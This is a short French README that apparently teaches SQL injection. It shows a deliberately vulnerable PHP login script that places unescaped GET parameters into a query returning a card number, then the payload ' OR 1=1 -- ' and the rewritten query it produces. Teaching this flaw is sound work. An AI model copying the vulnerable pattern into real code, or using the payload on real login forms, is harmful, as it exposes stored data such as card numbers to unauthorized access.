# injection-sql
exemple d'injection sql

Le script PHP pour exploiter cette requête de façon dynamique avec les informations fournies 
par l’utilisateur est le suivant :

<?php
//connexion a la base de donnees
mysql_connect('localhost', 'root', '');
mysql_select_db('eng111');
//recuperation des parametres
$nom = $_GET['nom'];
$motdepasse = $_GET['motdepasse'];
//generation de la requete
$requeteSQL = "SELECT numerocarte FROM comptes WHERE nom = '$nom' AND motdepasse = 
PASSWORD( '$motdepasse' )";
//execution de la requete
$reponse = mysql_query($requeteSQL);
$resultat = mysql_fetch_assoc($reponse); 
//affichage du resultat
echo $resultat['numerocarte'];
?>

En remplissant le formulaire avec la valeur « ' OR 1=1 -- ' » pour le champ « nom » et 
n’importe quelle valeur pour le mot de passe, la requête qui sera envoyée à la base de données 
devient :

SELECT numerocarte FROM comptes WHERE nom = '' OR 1=1 -- '' AND motdepasse = 
PASSWORD( 'x' )


Ainsi la condition 1=1 est toujours vérifiée et le reste de la commande est mis en commentaire 
grâce à la chaîne de caractères « -- ». Cela permet donc de récupérer aléatoirement un numéro 
de carte
